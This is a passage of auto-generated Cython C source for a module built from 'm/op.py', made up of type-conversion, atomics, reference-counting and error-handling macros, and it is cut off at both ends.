!defined(CYTHON_WITHOUT_ASSERTIONS)\n#define CYTHON_WITHOUT_ASSERTIONS\n#endif\n\n#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0\n#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0\n#define __PYX_DEFAULT_STRING_ENCODING ""\n#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString\n#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize\n#define __Pyx_uchar_cast(c) ((unsigned char)c)\n#define __Pyx_long_cast(x) ((long)x)\n#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\\\n    (sizeof(type) < sizeof(Py_ssize_t))  ||\\\n    (sizeof(type) > sizeof(Py_ssize_t) &&\\\n          likely(v < (type)PY_SSIZE_T_MAX ||\\\n                 v == (type)PY_SSIZE_T_MAX)  &&\\\n          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\\\n                                v == (type)PY_SSIZE_T_MIN)))  ||\\\n    (sizeof(type) == sizeof(Py_ssize_t) &&\\\n          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\\\n                               v == (type)PY_SSIZE_T_MAX)))  )\nstatic CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {\n    return (size_t) i < (size_t) limit;\n}\n#if defined (__cplusplus) && __cplusplus >= 201103L\n    #include <cstdlib>\n    #define __Pyx_sst_abs(value) std::abs(value)\n#elif SIZEOF_INT >= SIZEOF_SIZE_T\n    #define __Pyx_sst_abs(value) abs(value)\n#elif SIZEOF_LONG >= SIZEOF_SIZE_T\n    #define __Pyx_sst_abs(value) labs(value)\n#elif defined (_MSC_VER)\n    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))\n#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\n    #define __Pyx_sst_abs(value) llabs(value)\n#elif defined (__GNUC__)\n    #define __Pyx_sst_abs(value) __builtin_llabs(value)\n#else\n    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)\n#endif\nstatic CYTHON_INLINE Py_ssize_t __Pyx_ssize_strlen(const char *s);\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);\nstatic CYTHON_INLINE PyObject* __Pyx_PyByteArray_FromString(const char*);\n#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)\n#define __Pyx_PyBytes_FromString        PyBytes_FromString\n#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize\nstatic CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);\n#if CYTHON_ASSUME_SAFE_MACROS\n    #define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))\n    #define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))\n    #define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))\n    #define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))\n    #define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))\n    #define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))\n    #define __Pyx_PyByteArray_AsString(s) PyByteArray_AS_STRING(s)\n#else\n    #define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AsString(s))\n    #define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AsString(s))\n    #define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AsString(s))\n    #define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AsString(s))\n    #define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AsString(s))\n    #define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AsString(s))\n    #define __Pyx_PyByteArray_AsString(s) PyByteArray_AsString(s)\n#endif\n#define __Pyx_PyObject_AsWritableString(s)    ((char*)(__pyx_uintptr_t) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*)(__pyx_uintptr_t) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*)(__pyx_uintptr_t) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)\n#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)\n#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)\n#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)\n#define __Pyx_PyUnicode_FromOrdinal(o)       PyUnicode_FromOrdinal((int)o)\n#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode\nstatic CYTHON_INLINE PyObject *__Pyx_NewRef(PyObject *obj) {\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030a0000 || defined(Py_NewRef)\n    return Py_NewRef(obj);\n#else\n    Py_INCREF(obj);\n    return obj;\n#endif\n}\nstatic CYTHON_INLINE PyObject *__Pyx_XNewRef(PyObject *obj) {\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030a0000 || defined(Py_XNewRef)\n    return Py_XNewRef(obj);\n#else\n    Py_XINCREF(obj);\n    return obj;\n#endif\n}\nstatic CYTHON_INLINE PyObject *__Pyx_Owned_Py_None(int b);\nstatic CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);\nstatic CYTHON_INLINE PyObject* __Pyx_PyNumber_Long(PyObject* x);\n#define __Pyx_PySequence_Tuple(obj)\\\n    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))\nstatic CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);\nstatic CYTHON_INLINE PyObject * __Pyx_PyLong_FromSize_t(size_t);\nstatic CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);\n#if CYTHON_ASSUME_SAFE_MACROS\n#define __Pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))\n#define __Pyx_PyFloat_AS_DOUBLE(x) PyFloat_AS_DOUBLE(x)\n#else\n#define __Pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)\n#define __Pyx_PyFloat_AS_DOUBLE(x) PyFloat_AsDouble(x)\n#endif\n#define __Pyx_PyFloat_AsFloat(x) ((float) __Pyx_PyFloat_AsDouble(x))\n#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))\n#if CYTHON_USE_PYLONG_INTERNALS\n  #if PY_VERSION_HEX >= 0x030C00A7\n  #ifndef _PyLong_SIGN_MASK\n    #define _PyLong_SIGN_MASK 3\n  #endif\n  #ifndef _PyLong_NON_SIZE_BITS\n    #define _PyLong_NON_SIZE_BITS 3\n  #endif\n  #define __Pyx_PyLong_Sign(x)  (((PyLongObject*)x)->long_value.lv_tag & _PyLong_SIGN_MASK)\n  #define __Pyx_PyLong_IsNeg(x)  ((__Pyx_PyLong_Sign(x) & 2) != 0)\n  #define __Pyx_PyLong_IsNonNeg(x)  (!__Pyx_PyLong_IsNeg(x))\n  #define __Pyx_PyLong_IsZero(x)  (__Pyx_PyLong_Sign(x) & 1)\n  #define __Pyx_PyLong_IsPos(x)  (__Pyx_PyLong_Sign(x) == 0)\n  #define __Pyx_PyLong_CompactValueUnsigned(x)  (__Pyx_PyLong_Digits(x)[0])\n  #define __Pyx_PyLong_DigitCount(x)  ((Py_ssize_t) (((PyLongObject*)x)->long_value.lv_tag >> _PyLong_NON_SIZE_BITS))\n  #define __Pyx_PyLong_SignedDigitCount(x)\\\n        ((1 - (Py_ssize_t) __Pyx_PyLong_Sign(x)) * __Pyx_PyLong_DigitCount(x))\n  #if defined(PyUnstable_Long_IsCompact) && defined(PyUnstable_Long_CompactValue)\n    #define __Pyx_PyLong_IsCompact(x)     PyUnstable_Long_IsCompact((PyLongObject*) x)\n    #define __Pyx_PyLong_CompactValue(x)  PyUnstable_Long_CompactValue((PyLongObject*) x)\n  #else\n    #define __Pyx_PyLong_IsCompact(x)     (((PyLongObject*)x)->long_value.lv_tag < (2 << _PyLong_NON_SIZE_BITS))\n    #define __Pyx_PyLong_CompactValue(x)  ((1 - (Py_ssize_t) __Pyx_PyLong_Sign(x)) * (Py_ssize_t) __Pyx_PyLong_Digits(x)[0])\n  #endif\n  typedef Py_ssize_t  __Pyx_compact_pylong;\n  typedef size_t  __Pyx_compact_upylong;\n  #else\n  #define __Pyx_PyLong_IsNeg(x)  (Py_SIZE(x) < 0)\n  #define __Pyx_PyLong_IsNonNeg(x)  (Py_SIZE(x) >= 0)\n  #define __Pyx_PyLong_IsZero(x)  (Py_SIZE(x) == 0)\n  #define __Pyx_PyLong_IsPos(x)  (Py_SIZE(x) > 0)\n  #define __Pyx_PyLong_CompactValueUnsigned(x)  ((Py_SIZE(x) == 0) ? 0 : __Pyx_PyLong_Digits(x)[0])\n  #define __Pyx_PyLong_DigitCount(x)  __Pyx_sst_abs(Py_SIZE(x))\n  #define __Pyx_PyLong_SignedDigitCount(x)  Py_SIZE(x)\n  #define __Pyx_PyLong_IsCompact(x)  (Py_SIZE(x) == 0 || Py_SIZE(x) == 1 || Py_SIZE(x) == -1)\n  #define __Pyx_PyLong_CompactValue(x)\\\n        ((Py_SIZE(x) == 0) ? (sdigit) 0 : ((Py_SIZE(x) < 0) ? -(sdigit)__Pyx_PyLong_Digits(x)[0] : (sdigit)__Pyx_PyLong_Digits(x)[0]))\n  typedef sdigit  __Pyx_compact_pylong;\n  typedef digit  __Pyx_compact_upylong;\n  #endif\n  static CYTHON_INLINE int __Pyx_PyLong_CompactAsLong(PyObject *x, long *return_value);\n  #if PY_VERSION_HEX >= 0x030C00A5\n  #define __Pyx_PyLong_Digits(x)  (((PyLongObject*)x)->long_value.ob_digit)\n  #else\n  #define __Pyx_PyLong_Digits(x)  (((PyLongObject*)x)->ob_digit)\n  #endif\n#endif\n#if __PYX_DEFAULT_STRING_ENCODING_IS_UTF8\n  #define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)\n#elif __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n  #define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeASCII(c_str, size, NULL)\n#else\n  #define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)\n#endif\n\n\n\n#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))\n  #define likely(x)   __builtin_expect(!!(x), 1)\n  #define unlikely(x) __builtin_expect(!!(x), 0)\n#else \n  #define likely(x)   (x)\n  #define unlikely(x) (x)\n#endif \n\n#ifdef __cplusplus\n#if __cplusplus > 201103L\n#include <type_traits>\n#endif\ntemplate <typename T>\nstatic void __Pyx_pretend_to_initialize(T* ptr) {\n#if __cplusplus > 201103L\n    if ((std::is_trivially_default_constructible<T>::value))\n#endif\n        *ptr = T();\n    (void)ptr;\n}\n#else\nstatic CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }\n#endif\n\n\n#if !CYTHON_USE_MODULE_STATE\nstatic PyObject *__pyx_m = NULL;\n#endif\nstatic int __pyx_lineno;\nstatic int __pyx_clineno = 0;\nstatic const char * const __pyx_cfilenm = __FILE__;\nstatic const char *__pyx_filename;\n\n\n\nstatic const char* const __pyx_f[] = {\n  "m/op.py",\n};\n\n\n#include <pythread.h>\n#ifndef CYTHON_ATOMICS\n    #define CYTHON_ATOMICS 1\n#endif\n#define __PYX_CYTHON_ATOMICS_ENABLED() CYTHON_ATOMICS\n#define __PYX_GET_CYTHON_COMPILING_IN_CPYTHON_FREETHREADING() CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n#define __pyx_atomic_int_type int\n#define __pyx_nonatomic_int_type int\n#if CYTHON_ATOMICS && (defined(__STDC_VERSION__) &&\\\n                        (__STDC_VERSION__ >= 201112L) &&\\\n                        !defined(__STDC_NO_ATOMICS__))\n    #include <stdatomic.h>\n#elif CYTHON_ATOMICS && (defined(__cplusplus) && (\\\n                    (__cplusplus >= 201103L) ||\\\n                    (defined(_MSC_VER) && _MSC_VER >= 1700)))\n    #include <atomic>\n#endif\n#if CYTHON_ATOMICS && (defined(__STDC_VERSION__) &&\\\n                        (__STDC_VERSION__ >= 201112L) &&\\\n                        !defined(__STDC_NO_ATOMICS__) &&\\\n                       ATOMIC_INT_LOCK_FREE == 2)\n    #undef __pyx_atomic_int_type\n    #define __pyx_atomic_int_type atomic_int\n    #define __pyx_atomic_ptr_type atomic_uintptr_t\n    #define __pyx_nonatomic_ptr_type uintptr_t\n    #define __pyx_atomic_incr_relaxed(value) atomic_fetch_add_explicit(value, 1, memory_order_relaxed)\n    #define __pyx_atomic_incr_acq_rel(value) atomic_fetch_add_explicit(value, 1, memory_order_acq_rel)\n    #define __pyx_atomic_decr_acq_rel(value) atomic_fetch_sub_explicit(value, 1, memory_order_acq_rel)\n    #define __pyx_atomic_sub(value, arg) atomic_fetch_sub(value, arg)\n    #define __pyx_atomic_int_cmp_exchange(value, expected, desired) atomic_compare_exchange_strong(value, expected, desired)\n    #define __pyx_atomic_load(value) atomic_load(value)\n    #define __pyx_atomic_store(value, new_value) atomic_store(value, new_value)\n    #define __pyx_atomic_pointer_load_relaxed(value) atomic_load_explicit(value, memory_order_relaxed)\n    #define __pyx_atomic_pointer_load_acquire(value) atomic_load_explicit(value, memory_order_acquire)\n    #define __pyx_atomic_pointer_exchange(value, new_value) atomic_exchange(value, (__pyx_nonatomic_ptr_type)new_value)\n    #if defined(__PYX_DEBUG_ATOMICS) && defined(_MSC_VER)\n        #pragma message ("Using standard C atomics")\n    #elif defined(__PYX_DEBUG_ATOMICS)\n        #warning "Using standard C atomics"\n    #endif\n#elif CYTHON_ATOMICS && (defined(__cplusplus) && (\\\n                    (__cplusplus >= 201103L) ||\\\n\\\n                    (defined(_MSC_VER) && _MSC_VER >= 1700)) &&\\\n                    ATOMIC_INT_LOCK_FREE == 2)\n    #undef __pyx_atomic_int_type\n    #define __pyx_atomic_int_type std::atomic_int\n    #define __pyx_atomic_ptr_type std::atomic_uintptr_t\n    #define __pyx_nonatomic_ptr_type uintptr_t\n    #define __pyx_atomic_incr_relaxed(value) std::atomic_fetch_add_explicit(value, 1, std::memory_order_relaxed)\n    #define __pyx_atomic_incr_acq_rel(value) std::atomic_fetch_add_explicit(value, 1, std::memory_order_acq_rel)\n    #define __pyx_atomic_decr_acq_rel(value) std::atomic_fetch_sub_explicit(value, 1, std::memory_order_acq_rel)\n    #define __pyx_atomic_sub(value, arg) std::atomic_fetch_sub(value, arg)\n    #define __pyx_atomic_int_cmp_exchange(value, expected, desired) std::atomic_compare_exchange_strong(value, expected, desired)\n    #define __pyx_atomic_load(value) std::atomic_load(value)\n    #define __pyx_atomic_store(value, new_value) std::atomic_store(value, new_value)\n    #define __pyx_atomic_pointer_load_relaxed(value) std::atomic_load_explicit(value, std::memory_order_relaxed)\n    #define __pyx_atomic_pointer_load_acquire(value) std::atomic_load_explicit(value, std::memory_order_acquire)\n    #define __pyx_atomic_pointer_exchange(value, new_value) std::atomic_exchange(value, (__pyx_nonatomic_ptr_type)new_value)\n    #if defined(__PYX_DEBUG_ATOMICS) && defined(_MSC_VER)\n        #pragma message ("Using standard C++ atomics")\n    #elif defined(__PYX_DEBUG_ATOMICS)\n        #warning "Using standard C++ atomics"\n    #endif\n#elif CYTHON_ATOMICS && (__GNUC__ >= 5 || (__GNUC__ == 4 &&\\\n                    (__GNUC_MINOR__ > 1 ||\\\n                    (__GNUC_MINOR__ == 1 && __GNUC_PATCHLEVEL__ >= 2))))\n    #define __pyx_atomic_ptr_type void*\n    #define __pyx_atomic_incr_relaxed(value) __sync_fetch_and_add(value, 1)\n    #define __pyx_atomic_incr_acq_rel(value) __sync_fetch_and_add(value, 1)\n    #define __pyx_atomic_decr_acq_rel(value) __sync_fetch_and_sub(value, 1)\n    #define __pyx_atomic_sub(value, arg) __sync_fetch_and_sub(value, arg)\n    static CYTHON_INLINE int __pyx_atomic_int_cmp_exchange(__pyx_atomic_int_type* value, __pyx_nonatomic_int_type* expected, __pyx_nonatomic_int_type desired) {\n        __pyx_nonatomic_int_type old = __sync_val_compare_and_swap(value, *expected, desired);\n        int result = old == *expected;\n        *expected = old;\n        return result;\n    }\n    #define __pyx_atomic_load(value) __sync_fetch_and_add(value, 0)\n    #define __pyx_atomic_store(value, new_value) __sync_lock_test_and_set(value, new_value)\n    #define __pyx_atomic_pointer_load_relaxed(value) __sync_fetch_and_add(value, 0)\n    #define __pyx_atomic_pointer_load_acquire(value) __sync_fetch_and_add(value, 0)\n    #define __pyx_atomic_pointer_exchange(value, new_value) __sync_lock_test_and_set(value, (__pyx_atomic_ptr_type)new_value)\n    #ifdef __PYX_DEBUG_ATOMICS\n        #warning "Using GNU atomics"\n    #endif\n#elif CYTHON_ATOMICS && defined(_MSC_VER)\n    #include <intrin.h>\n    #undef __pyx_atomic_int_type\n    #define __pyx_atomic_int_type long\n    #define __pyx_atomic_ptr_type void*\n    #undef __pyx_nonatomic_int_type\n    #define __pyx_nonatomic_int_type long\n    #pragma intrinsic (_InterlockedExchangeAdd, _InterlockedExchange, _InterlockedCompareExchange, _InterlockedCompareExchangePointer, _InterlockedExchangePointer)\n    #define __pyx_atomic_incr_relaxed(value) _InterlockedExchangeAdd(value, 1)\n    #define __pyx_atomic_incr_acq_rel(value) _InterlockedExchangeAdd(value, 1)\n    #define __pyx_atomic_decr_acq_rel(value) _InterlockedExchangeAdd(value, -1)\n    #define __pyx_atomic_sub(value, arg) _InterlockedExchangeAdd(value, -arg)\n    static CYTHON_INLINE int __pyx_atomic_int_cmp_exchange(__pyx_atomic_int_type* value, __pyx_nonatomic_int_type* expected, __pyx_nonatomic_int_type desired) {\n        __pyx_nonatomic_int_type old = _InterlockedCompareExchange(value, desired, *expected);\n        int result = old == *expected;\n        *expected = old;\n        return result;\n    }\n    #define __pyx_atomic_load(value) _InterlockedExchangeAdd(value, 0)\n    #define __pyx_atomic_store(value, new_value) _InterlockedExchange(value, new_value)\n    #define __pyx_atomic_pointer_load_relaxed(value) *(void * volatile *)value\n    #define __pyx_atomic_pointer_load_acquire(value) _InterlockedCompareExchangePointer(value, 0, 0)\n    #define __pyx_atomic_pointer_exchange(value, new_value) _InterlockedExchangePointer(value, (__pyx_atomic_ptr_type)new_value)\n    #ifdef __PYX_DEBUG_ATOMICS\n        #pragma message ("Using MSVC atomics")\n    #endif\n#else\n    #undef CYTHON_ATOMICS\n    #define CYTHON_ATOMICS 0\n    #ifdef __PYX_DEBUG_ATOMICS\n        #warning "Not using atomics"\n    #endif\n#endif\n#if CYTHON_ATOMICS\n    #define __pyx_add_acquisition_count(memview)\\\n             __pyx_atomic_incr_relaxed(__pyx_get_slice_count_pointer(memview))\n    #define __pyx_sub_acquisition_count(memview)\\\n            __pyx_atomic_decr_acq_rel(__pyx_get_slice_count_pointer(memview))\n#else\n    #define __pyx_add_acquisition_count(memview)\\\n            __pyx_add_acquisition_count_locked(__pyx_get_slice_count_pointer(memview), memview->lock)\n    #define __pyx_sub_acquisition_count(memview)\\\n            __pyx_sub_acquisition_count_locked(__pyx_get_slice_count_pointer(memview), memview->lock)\n#endif\n\n\n#include <structmember.h>\n\n\n#if !CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n#define __Pyx_PyCriticalSection void*\n#define __Pyx_PyCriticalSection2 void*\n#define __Pyx_PyCriticalSection_Begin1(cs, arg) (void)cs\n#define __Pyx_PyCriticalSection_Begin2(cs, arg1, arg2) (void)cs\n#define __Pyx_PyCriticalSection_End1(cs)\n#define __Pyx_PyCriticalSection_End2(cs)\n#else\n#define __Pyx_PyCriticalSection PyCriticalSection\n#define __Pyx_PyCriticalSection2 PyCriticalSection2\n#define __Pyx_PyCriticalSection_Begin1 PyCriticalSection_Begin\n#define __Pyx_PyCriticalSection_Begin2 PyCriticalSection2_Begin\n#define __Pyx_PyCriticalSection_End1 PyCriticalSection_End\n#define __Pyx_PyCriticalSection_End2 PyCriticalSection2_End\n#endif\n#if PY_VERSION_HEX < 0x030d0000 || CYTHON_COMPILING_IN_LIMITED_API\n#define __Pyx_BEGIN_CRITICAL_SECTION(o) {\n#define __Pyx_END_CRITICAL_SECTION() }\n#else\n#define __Pyx_BEGIN_CRITICAL_SECTION Py_BEGIN_CRITICAL_SECTION\n#define __Pyx_END_CRITICAL_SECTION Py_END_CRITICAL_SECTION\n#endif\n\n\n\n\n\n\nstruct __pyx_obj_2op___pyx_scope_struct__genexpr;\nstruct __pyx_obj_2op___pyx_scope_struct_1_genexpr;\nstruct __pyx_obj_2op___pyx_scope_struct_2_genexpr;\nstruct __pyx_obj_2op___pyx_scope_struct_3_genexpr;\n\n\nstruct __pyx_obj_2op___pyx_scope_struct__genexpr {\n  PyObject_HEAD\n  PyObject *__pyx_genexpr_arg_0;\n  PyObject *__pyx_v_i;\n};\n\n\n\nstruct __pyx_obj_2op___pyx_scope_struct_1_genexpr {\n  PyObject_HEAD\n  PyObject *__pyx_genexpr_arg_0;\n  PyObject *__pyx_v_i;\n};\n\n\n\nstruct __pyx_obj_2op___pyx_scope_struct_2_genexpr {\n  PyObject_HEAD\n  PyObject *__pyx_genexpr_arg_0;\n  PyObject *__pyx_v_i;\n};\n\n\n\nstruct __pyx_obj_2op___pyx_scope_struct_3_genexpr {\n  PyObject_HEAD\n  long __pyx_v__;\n};\n\n\n\n\n\n#ifndef CYTHON_REFNANNY\n  #define CYTHON_REFNANNY 0\n#endif\n#if CYTHON_REFNANNY\n  typedef struct {\n    void (*INCREF)(void*, PyObject*, Py_ssize_t);\n    void (*DECREF)(void*, PyObject*, Py_ssize_t);\n    void (*GOTREF)(void*, PyObject*, Py_ssize_t);\n    void (*GIVEREF)(void*, PyObject*, Py_ssize_t);\n    void* (*SetupContext)(const char*, Py_ssize_t, const char*);\n    void (*FinishContext)(void**);\n  } __Pyx_RefNannyAPIStruct;\n  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;\n  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);\n  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\\\n          if (acquire_gil) {\\\n              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\\\n              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), (__LINE__), (__FILE__));\\\n              PyGILState_Release(__pyx_gilstate_save);\\\n          } else {\\\n              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), (__LINE__), (__FILE__));\\\n          }\n  #define __Pyx_RefNannyFinishContextNogil() {\\\n              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\\\n              __Pyx_RefNannyFinishContext();\\\n              PyGILState_Release(__pyx_gilstate_save);\\\n          }\n  #define __Pyx_RefNannyFinishContextNogil() {\\\n              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\\\n              __Pyx_RefNannyFinishContext();\\\n              PyGILState_Release(__pyx_gilstate_save);\\\n          }\n  #define __Pyx_RefNannyFinishContext()\\\n          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)\n  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))\n  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))\n  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))\n  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))\n  #define __Pyx_XINCREF(r)  do { if((r) == NULL); else {__Pyx_INCREF(r); }} while(0)\n  #define __Pyx_XDECREF(r)  do { if((r) == NULL); else {__Pyx_DECREF(r); }} while(0)\n  #define __Pyx_XGOTREF(r)  do { if((r) == NULL); else {__Pyx_GOTREF(r); }} while(0)\n  #define __Pyx_XGIVEREF(r) do { if((r) == NULL); else {__Pyx_GIVEREF(r);}} while(0)\n#else\n  #define __Pyx_RefNannyDeclarations\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\n  #define __Pyx_RefNannyFinishContextNogil()\n  #define __Pyx_RefNannyFinishContext()\n  #define __Pyx_INCREF(r) Py_INCREF(r)\n  #define __Pyx_DECREF(r) Py_DECREF(r)\n  #define __Pyx_GOTREF(r)\n  #define __Pyx_GIVEREF(r)\n  #define __Pyx_XINCREF(r) Py_XINCREF(r)\n  #define __Pyx_XDECREF(r) Py_XDECREF(r)\n  #define __Pyx_XGOTREF(r)\n  #define __Pyx_XGIVEREF(r)\n#endif\n#define __Pyx_Py_XDECREF_SET(r, v) do {\\\n        PyObject *tmp = (PyObject *) r;\\\n        r = v; Py_XDECREF(tmp);\\\n    } while (0)\n#define __Pyx_XDECREF_SET(r, v) do {\\\n        PyObject *tmp = (PyObject *) r;\\\n        r = v; __Pyx_XDECREF(tmp);\\\n    } while (0)\n#define __Pyx_DECREF_SET(r, v) do {\\\n        PyObject *tmp = (PyObject *) r;\\\n        r = v; __Pyx_DECREF(tmp);\\\n    } while (0)\n#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)\n#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)\n\n\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_PyErr_ExceptionMatches(err) __Pyx_PyErr_ExceptionMatchesInState(__pyx_tstate, err)\nstatic CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err);\n#else\n#define __Pyx_PyErr_ExceptionMatches(err)  PyErr_ExceptionMatches(err)\n#endif\n\n\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;\n#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;\n#if PY_VERSION_HEX >= 0x030C00A6\n#define __Pyx_PyErr_Occurred()  (__pyx_tstate->current_exception != NULL)\n#define __Pyx_PyErr_CurrentExceptionType()  (__pyx_tstate->current_exception ? (PyObject*) Py_TYPE(__pyx_tstate->current_exception) : (PyObject*) NULL)\n#else\n#define __Pyx_PyErr_Occurred()  (__pyx_tstate->curexc_type != NULL)\n#define __Pyx_PyErr_CurrentExceptionType()  (__pyx_tstate->curexc_type)\n#endif\n#else\n#define __Pyx_PyThreadState_declare\n#define __Pyx_PyThreadState_assign\n#define __Pyx_PyErr_Occurred()  (PyErr_Occurred() != NULL)\n#define __Pyx_PyErr_CurrentExceptionType()  PyErr_Occurred()\n#endif\n\n\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)\n#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)\n#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)\n#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)\n#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)\nstatic CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);\nstatic CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030C00A6\n#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))\n#else\n#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)\n#endif\n#else\n#define __Pyx_PyErr_Clear() PyErr_Clear()\n#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)\n#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)\n#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)\n#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)\n#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)\n#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)\n#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)\n#endif\n\n\n#if CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PyObject* 